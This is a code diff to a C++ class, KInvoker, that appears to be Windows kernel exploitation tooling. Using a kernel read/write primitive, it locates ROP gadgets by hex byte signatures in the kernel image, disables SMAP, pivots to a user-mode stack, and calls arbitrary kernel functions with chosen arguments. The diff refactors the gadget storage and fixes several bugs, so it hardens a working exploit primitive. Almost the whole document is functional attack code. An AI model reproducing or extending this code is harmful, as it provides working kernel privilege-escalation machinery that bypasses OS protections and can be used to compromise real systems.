@@ -23,6 +23,9 @@ class KInvoker
 public:
 	KInvoker() : m_TerminateWorker(false) {
 		m_WorkerThread = std::thread(&KInvoker::WorkerThread, this);
+		if (!InitializeGadgets()) {
+			// error
+		}
 	}
 
 	~KInvoker() {
@@ -55,10 +58,9 @@ public:
 		DWORD currentTid = GetCurrentThreadId();
 		void* newStack = nullptr;
 
-		m_TaskQueue.push([args, event, Function, currentTid, &newStack]
-			{
+		m_TaskQueue.push([&] {
 				kAddress thread = Resolves::GetThreadAddress(currentTid);
-				OverrideThreadStackWithFunctionCall(Function, thread, newStack, args);
+				OverrideThreadStackWithFunctionCall(Function, thread, (Byte**) & newStack, args);
 				SetEvent(event);
 			});
 
@@ -93,10 +95,10 @@ private:
 	}
 
 	template <typename... Args>
-	static void OverrideThreadStackWithFunctionCall(
+	void OverrideThreadStackWithFunctionCall(
 		_In_ kAddress Function,
 		_In_ kAddress CallingThread,
-		_Out_ PVOID& NewStack,
+		Byte** NewStack,
 		_In_ std::tuple<Args...> Arguments
 	) {
 
@@ -106,14 +108,13 @@ private:
 		// Read previous trap frame & for later restoration
 		//
 		std::vector<Byte> previousStackData = g_Rw->ReadBuffer(rsp + 8, c_TrapFrameSize + 8);
-
 		
 		constexpr DWORD c_KernelStackSize = 12 * 0x1000;
 
 		// we add another page for our gadgets' shenanigens
 		constexpr DWORD c_PivotedStackSize = c_KernelStackSize + 0x1000;
-		PVOID newStack = VirtualAlloc(nullptr, c_KernelStackSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-		NewStack = NewStack;
+		Byte* newStack = (Byte*) VirtualAlloc(nullptr, c_KernelStackSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		*NewStack = newStack;
 
 		auto* stackTop = (Byte*)newStack + c_KernelStackSize;
 		
@@ -142,7 +143,7 @@ private:
 		// Note: might come later to fuck us :(
 		//
 
-		PUT_STACK(s_Gadgets.DisableSmap);
+		PUT_STACK(m_Gadgets.DisableSmap);
 		
 		rsp += 0xb8;
 		PUT_STACK(0x41); // pop r15
@@ -168,18 +169,18 @@ private:
 		// .text:0000000140408200                  retn
 		//
 
-		PUT_STACK(s_Gadgets.StackPivot);
+		PUT_STACK(m_Gadgets.StackPivot);
 		
 		//
 		// Note: We've now switched to usermode stack.
 		//
 
-		auto uRsp = stackTop;
+		auto userRsp = stackTop;
 
 #undef PUT_STACK
-#define PUT_STACK(val) *(Qword*)(uRsp)++ = Qword(val);
+#define PUT_STACK(val) *(Qword*)(userRsp)++ = Qword(val);
 
-		uRsp += 0x30;		// add rsp, 0x30
+		userRsp += 0x30;		// add rsp, 0x30
 		PUT_STACK(0x1337);	// pop rdi
 		PUT_STACK(0x1337);	// pop rsp
 		PUT_STACK(0x1337);	// pop rbp
@@ -198,13 +199,13 @@ private:
 		//  jmp rax
 		//
 
-		PUT_STACK(s_Gadgets.Retpoline);
+		PUT_STACK(m_Gadgets.Retpoline);
 
-		uRsp += 0x20;
+		userRsp += 0x20;
 
 		// add jump target: Function
 		PUT_STACK(Function);
-		auto* beforeArgsRsp = uRsp;
+		auto* beforeArgsRsp = userRsp;
 		
 		// add register arguments
 		constexpr auto NumberOfArguments = std::tuple_size<decltype(Arguments)>::value;
@@ -215,23 +216,23 @@ private:
 		if constexpr (NumberOfArguments >= 4) PUT_STACK(std::get<3>(Arguments));
 
 		// update rsp to after add rsp, 0x48
-		uRsp = beforeArgsRsp + 0x28;
+		userRsp = beforeArgsRsp + 0x28;
 
 		// add remaining stack arguments
 		
-		uRsp += 0x20; // save shadow space
+		userRsp += 0x20; // save shadow space
 
 		if constexpr (NumberOfArguments >= 5) {
 			auto indiciesOfRemainingArgs = std::make_index_sequence<NumberOfArguments - 4>{};
 			Qword remaining[] = { Qword(std::get<indiciesOfRemainingArgs>(Arguments))... };
-			std::memcpy(uRsp, remaining, sizeof(remaining));
+			std::memcpy(userRsp, remaining, sizeof(remaining));
 
-			uRsp += sizeof(remaining);
+			userRsp += sizeof(remaining);
 		}
 
 		// go back to where we've been - and return to user mode lol
 		
-		std::memcpy(uRsp, previousStackData.data(), previousStackData.size());
+		std::memcpy(userRsp, previousStackData.data(), previousStackData.size());
 	}
 
 	void WorkerThread()
@@ -241,7 +242,7 @@ private:
 			std::function<void()> workItem;
 			{
 				std::unique_lock<std::mutex> lock(m_TaskQueueMutex);
-				m_QueueUpdateVariable.wait(lock, [this] { return !m_TaskQueue.empty() || terminate; });
+				m_QueueUpdateVariable.wait(lock, [this] { return !m_TaskQueue.empty() || m_TerminateWorker; });
 
 				if (m_TerminateWorker && m_TaskQueue.empty()) {
 					return;
@@ -294,23 +295,25 @@ private:
 		return std::nullopt;
 	}
 
-	static bool InitializeGadgets()
+	bool InitializeGadgets()
 	{
 		const std::string RetpolineCode = "488b442420488b4c2428488b5424304c8b4424384c8b4c24404883c44848ffe0";
 		auto retpolineSignature = Sig::FromHex(RetpolineCode);
 		auto retpolineAddress =  g_KernelBinary->FindSignature(retpolineSignature, KernelBinary::LocationFlags::InCode);
 		if (!retpolineAddress) return false;
-		s_Gadgets.Retpoline = retpolineAddress.value();
+		m_Gadgets.Retpoline = retpolineAddress.value();
 
 		const std::string StackPivotCode = "488be54883c4305f5e5dc3";
 		auto stackPivotSignature = Sig::FromHex(StackPivotCode);
 		auto stackPivotAddress = g_KernelBinary->FindSignature(stackPivotSignature, KernelBinary::LocationFlags::InCode);
 		if (!stackPivotAddress) return false;
-		s_Gadgets.StackPivot = stackPivotAddress.value();
+		m_Gadgets.StackPivot = stackPivotAddress.value();
 	
 		auto smapGadget = TryFindSmapGadget();
 		if (!smapGadget) return false;
-		s_Gadgets.DisableSmap = smapGadget.value();
+		m_Gadgets.DisableSmap = smapGadget.value();
+
+		return true;
 	}
 
 
@@ -321,9 +324,9 @@ private:
 	std::condition_variable m_QueueUpdateVariable;
 	std::atomic<bool> m_TerminateWorker;
 
-	static struct {
+	struct {
 		kAddress Retpoline;
 		kAddress StackPivot;
 		kAddress DisableSmap;
-	} s_Gadgets;
+	} m_Gadgets;
 };
